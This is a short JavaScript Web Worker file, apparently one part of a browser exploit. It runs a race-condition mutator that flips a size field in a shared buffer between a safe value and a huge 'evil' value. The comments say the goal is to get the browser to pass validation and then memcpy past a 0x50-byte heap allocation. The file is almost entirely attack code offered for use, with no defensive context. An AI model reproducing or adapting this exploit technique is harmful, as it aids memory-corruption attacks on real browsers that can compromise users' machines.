// mutator.js

onmessage = function(e) {
    const view = new DataView(e.data.buffer);
    
    const SIZE_OFFSET = 4; // Assuming size is at offset 4 in the V8 header
    const SAFE_SIZE = 0x50;
    
    // This is our corruption payload. 
    // We want the Browser to memcpy() this many bytes into a 0x50 sized heap allocation.
    const EVIL_SIZE = 0x7FFFFFFF; 

    console.log("[Worker] Mutator spinning...");

    // INFINITE LOOP: Flip the size between safe and evil.
    // We want the Browser process to read SAFE_SIZE during validation,
    // and then read EVIL_SIZE a microsecond later during the memcpy().
    while(true) {
        view.setUint32(SIZE_OFFSET, SAFE_SIZE, true);
        view.setUint32(SIZE_OFFSET, EVIL_SIZE, true);
    }
};
